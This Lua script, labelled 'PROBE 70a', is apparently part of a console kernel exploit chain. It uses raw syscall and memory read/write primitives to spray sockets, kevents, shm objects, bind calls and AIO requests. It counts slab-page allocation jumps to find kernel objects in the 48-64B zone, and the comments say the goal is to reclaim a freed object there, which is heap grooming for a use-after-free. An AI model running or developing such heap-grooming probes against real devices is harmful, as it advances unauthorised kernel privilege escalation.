-- CRASH_CLASS: LOW
-- PROBE 70a: Measure kernel allocation size for EVERY available 48-64B candidate
--
-- 69l proved EVF=224B, namedobj=170B — wrong zone for R (48B/64B bucket).
-- This probe measures every syscall path that might create 48-64B kernel objects:
--   - setsockopt with various small options (IP_OPTIONS=40B, SO_BINDTODEVICE, etc.)
--   - bind() sockaddr copyin (16-28B)
--   - connect() sockaddr copyin
--   - shm_open name copyin (variable length)
--   - sendto sockaddr buffer
--   - kevent struct copyin (64B per event)
--   - AIO request struct copyin (0x28=40B per request)
--   - thr_set_name string copyin
--
-- Method: create 2000 objects of each type, measure 624 jumps (slab page allocs).
-- 16384/jump_gap = kernel object size. Objects in the 48-64B range are R-zone candidates.

print("=== PROBE 70a: SMALL ALLOCATION SIZING ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end

local pid = N(mk(20)())
print("pid=" .. pid)

local sc624 = mk(624)
local function get624()
    local ok, v = pcall(function() return sc624(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)) end)
    if ok then return N(v) else return -1 end
end

local base624 = get624()
print("624 baseline: " .. base624)
print("")

-- [A] setsockopt IP_OPTIONS (max 44 bytes copyin -> 64B bucket?)
print("[A] setsockopt IP_OPTIONS spray (200 sockets)")
local fds_a = {}
local jumps_a = {}
local prev_a = get624()
for i = 1, 200 do
    local ok, fd = pcall(function()
        return mk(97)(uint64(2), uint64(2), uint64(0)) -- AF_INET, SOCK_DGRAM
    end)
    if ok and N(fd) >= 0 then
        local sfd = N(fd)
        fds_a[#fds_a + 1] = sfd
        -- Set IP_OPTIONS with 40 bytes of data
        local optbuf = memory.alloc(48)
        for j = 0, 39 do wd(optbuf + j, 0x41) end
        pcall(function()
            mk(105)(uint64(sfd), uint64(0), uint64(4), uint64(N(optbuf)), uint64(40))
        end)
        local cur = get624()
        if cur > prev_a then
            jumps_a[#jumps_a + 1] = {i = i, from = prev_a, to = cur}
            prev_a = cur
        end
    end
    if i % 50 == 0 then
        print(string.format("  %d sockets, %d 624-jumps", i, #jumps_a))
    end
end
print(string.format("  total: %d sockets, %d jumps", #fds_a, #jumps_a))
if #jumps_a >= 2 then
    local gaps = {}
    for j = 2, #jumps_a do
        local gap = jumps_a[j].i - jumps_a[j-1].i
        gaps[#gaps + 1] = gap
        print(string.format("    gap %d->%d: %d objects (624: %d->%d)", j-1, j, gap, jumps_a[j-1].to, jumps_a[j].to))
    end
end
print("")

-- [B] kevent registration spray (struct kevent = 64 bytes on FreeBSD)
print("[B] kevent registration spray (200 kqueue+timer events)")
local kq_fds = {}
local jumps_b = {}
local prev_b = get624()
for i = 1, 200 do
    local ok, kqfd = pcall(function() return mk(362)() end)
    if ok and N(kqfd) >= 0 then
        local kfd = N(kqfd)
        kq_fds[#kq_fds + 1] = kfd
        -- Register EVFILT_TIMER (-7)
        local kev = memory.alloc(64)
        wq(kev + 0, uint64(i))         -- ident
        wd(kev + 8, 0xFFF9)            -- filter = EVFILT_TIMER (-7) as uint16
        wd(kev + 10, 0x0001)           -- flags = EV_ADD
        wd(kev + 12, 0)                -- fflags
        wq(kev + 16, uint64(1000000))  -- data (1000s timeout, won't fire)
        wq(kev + 24, uint64(0))        -- udata
        pcall(function()
            mk(363)(uint64(kfd), uint64(N(kev)), uint64(1), uint64(0), uint64(0), uint64(0))
        end)
        local cur = get624()
        if cur > prev_b then
            jumps_b[#jumps_b + 1] = {i = i, from = prev_b, to = cur}
            prev_b = cur
        end
    end
    if i % 50 == 0 then
        print(string.format("  %d kqueue+timer, %d 624-jumps", i, #jumps_b))
    end
end
print(string.format("  total: %d kqueue+timer, %d jumps", #kq_fds, #jumps_b))
if #jumps_b >= 2 then
    for j = 2, #jumps_b do
        local gap = jumps_b[j].i - jumps_b[j-1].i
        print(string.format("    gap %d->%d: %d objects (624: %d->%d)", j-1, j, gap, jumps_b[j-1].to, jumps_b[j].to))
    end
end
print("")

-- [C] socketpair spray (AF_UNIX SOCK_DGRAM, 2 fds per pair)
print("[C] socketpair spray (200 pairs = 400 socket objects)")
local sp_fds = {}
local jumps_c = {}
local prev_c = get624()
local sp_buf = memory.alloc(16)
for i = 1, 200 do
    wd(sp_buf, 0); wd(sp_buf + 4, 0)
    local ok, ret = pcall(function()
        return mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sp_buf)))
    end)
    if ok and N(ret) == 0 then
        local fd1 = rd(sp_buf)
        local fd2 = rd(sp_buf + 4)
        if fd1 then sp_fds[#sp_fds + 1] = fd1 end
        if fd2 then sp_fds[#sp_fds + 1] = fd2 end
        local cur = get624()
        if cur > prev_c then
            jumps_c[#jumps_c + 1] = {i = i, from = prev_c, to = cur}
            prev_c = cur
        end
    end
    if i % 50 == 0 then
        print(string.format("  %d pairs, %d 624-jumps", i, #jumps_c))
    end
end
print(string.format("  total: %d fds, %d jumps", #sp_fds, #jumps_c))
if #jumps_c >= 2 then
    for j = 2, #jumps_c do
        local gap = jumps_c[j].i - jumps_c[j-1].i
        print(string.format("    gap %d->%d: %d pairs (624: %d->%d)", j-1, j, gap, jumps_c[j-1].to, jumps_c[j].to))
    end
end
print("")

-- [D] shm_open with controlled name lengths
print("[D] shm_open with name lengths 8/32/48/64 bytes")
local shm_fds = {}
for _, nlen in ipairs({8, 32, 48, 64}) do
    local jumps_d = {}
    local prev_d = get624()
    local batch_fds = {}
    for i = 1, 100 do
        local name = "/" .. string.rep("x", nlen - 2) .. string.format("%02d", i % 100)
        local name_buf = memory.alloc(nlen + 2)
        for c = 1, #name do
            pcall(function() memory.write_byte(name_buf + c - 1, string.byte(name, c)) end)
        end
        pcall(function() memory.write_byte(name_buf + #name, 0) end)
        local ok, ret = pcall(function()
            return mk(482)(uint64(N(name_buf)), uint64(0x202), uint64(0x1B6))
        end)
        if ok and N(ret) >= 0 then
            batch_fds[#batch_fds + 1] = N(ret)
            local cur = get624()
            if cur > prev_d then
                jumps_d[#jumps_d + 1] = {i = i, from = prev_d, to = cur}
                prev_d = cur
            end
        end
    end
    print(string.format("  name_len=%d: %d fds, %d 624-jumps", nlen, #batch_fds, #jumps_d))
    if #jumps_d >= 2 then
        for j = 2, #jumps_d do
            local gap = jumps_d[j].i - jumps_d[j-1].i
            print(string.format("    gap %d->%d: %d objects (624: %d->%d)", j-1, j, gap, jumps_d[j-1].to, jumps_d[j].to))
        end
    end
    for _, fd in ipairs(batch_fds) do pcall(function() mk(6)(uint64(fd)) end) end
end
print("")

-- [E] bind() with various sockaddr sizes
print("[E] bind() sockaddr copyin (16B/28B/48B)")
for _, salen in ipairs({16, 28}) do
    local jumps_e = {}
    local prev_e = get624()
    local bound = 0
    for i = 1, 200 do
        local ok, fd = pcall(function()
            return mk(97)(uint64(2), uint64(2), uint64(0))
        end)
        if ok and N(fd) >= 0 then
            local sfd = N(fd)
            local sa = memory.alloc(salen + 4)
            if salen == 16 then
                wd(sa, 0x00020002)          -- AF_INET, len=16
                wd(sa + 4, 0x00000000)      -- INADDR_ANY
                wd(sa + 2, 1024 + i)        -- port (big-endian, varies)
            else
                wd(sa, 0x001C001C)          -- AF_INET6, len=28
            end
            local ok2, ret = pcall(function()
                return mk(104)(uint64(sfd), uint64(N(sa)), uint64(salen))
            end)
            if ok2 and N(ret) == 0 then bound = bound + 1 end
            local cur = get624()
            if cur > prev_e then
                jumps_e[#jumps_e + 1] = {i = i, from = prev_e, to = cur}
                prev_e = cur
            end
            pcall(function() mk(6)(uint64(sfd)) end)
        end
    end
    print(string.format("  sa_len=%d: %d bound, %d 624-jumps", salen, bound, #jumps_e))
    if #jumps_e >= 2 then
        for j = 2, #jumps_e do
            local gap = jumps_e[j].i - jumps_e[j-1].i
            print(string.format("    gap %d->%d: %d sockets (624: %d->%d)", j-1, j, gap, jumps_e[j-1].to, jumps_e[j].to))
        end
    end
end
print("")

-- [F] AIO self-reclaim sizing
-- From 69l: AIO had jumps at #21, #163, #166 (gaps 142, 3)
-- This suggests multiple objects per AIO request, one ~115B
-- Measure more carefully with single submits
print("[F] AIO single-submit sizing (500 individual requests)")
local sc_open = mk(5)
local ok, zerofd = pcall(function()
    local p = memory.alloc(16)
    for c = 1, 9 do pcall(function() memory.write_byte(p + c - 1, string.byte("/dev/zero", c)) end) end
    pcall(function() memory.write_byte(p + 9, 0) end)
    return sc_open(uint64(N(p)), uint64(0))
end)
local zfd = -1
if ok then zfd = N(zerofd) end
print("  /dev/zero fd=" .. zfd)

if zfd >= 0 then
    local jumps_f = {}
    local prev_f = get624()
    local aio_ids = {}
    local data_buf = memory.alloc(64)
    local result_buf = memory.alloc(8)
    local ids_buf = memory.alloc(8)
    for i = 1, 500 do
        local req = memory.alloc(0x28)
        wq(req + 0x00, uint64(0))           -- offset
        wq(req + 0x08, uint64(16))          -- nbytes
        wq(req + 0x10, uint64(N(data_buf))) -- buf
        wq(req + 0x18, uint64(N(result_buf))) -- result
        wq(req + 0x20, uint64(zfd))         -- fd
        wd(ids_buf, 0); wd(ids_buf + 4, 0)
        local ok2, ret = pcall(function()
            return mk(669)(uint64(1), uint64(N(req)), uint64(1), uint64(1), uint64(N(ids_buf)))
        end)
        if ok2 and N(ret) == 0 then
            local aid = rd(ids_buf)
            if aid and aid ~= 0 then
                aio_ids[#aio_ids + 1] = aid
            end
        end
        local cur = get624()
        if cur > prev_f then
            jumps_f[#jumps_f + 1] = {i = i, from = prev_f, to = cur, delta = cur - prev_f}
            prev_f = cur
        end
        if i % 100 == 0 then
            print(string.format("    %d submitted, %d 624-jumps", i, #jumps_f))
        end
    end
    print(string.format("  total: %d submitted, %d jumps", #aio_ids, #jumps_f))
    for j = 1, #jumps_f do
        local gap = 0
        if j > 1 then gap = jumps_f[j].i - jumps_f[j-1].i
        else gap = jumps_f[j].i end
        print(string.format("    jump %d at req #%d: gap=%d delta=%d", j, jumps_f[j].i, gap, jumps_f[j].delta))
    end

    -- Poll all, then delete
    local st_buf = memory.alloc(8)
    for _, aid in ipairs(aio_ids) do
        wd(ids_buf, aid)
        pcall(function() mk(664)(uint64(N(ids_buf)), uint64(1), uint64(N(st_buf))) end)
    end
    for _, aid in ipairs(aio_ids) do
        wd(ids_buf, aid)
        pcall(function() mk(662)(uint64(N(ids_buf)), uint64(1), uint64(N(st_buf))) end)
    end
end
print("")

-- [G] Summary
print("[G] SUMMARY")
print("  Candidates in 48-64B range (256 objects per 16KB page):")
print("  Look for jump gaps of ~256 in the data above.")
print("  If no syscall creates 64B-bucket objects, R-zone reclaim")
print("  requires same-subsystem AIO self-reclaim only.")
print("")

-- Cleanup: close sockets
for _, fd in ipairs(fds_a) do pcall(function() mk(6)(uint64(fd)) end) end
for _, fd in ipairs(kq_fds) do pcall(function() mk(6)(uint64(fd)) end) end
for _, fd in ipairs(sp_fds) do pcall(function() mk(6)(uint64(fd)) end) end

print("alive=YES")
print("=== PROBE 70a COMPLETE ===")
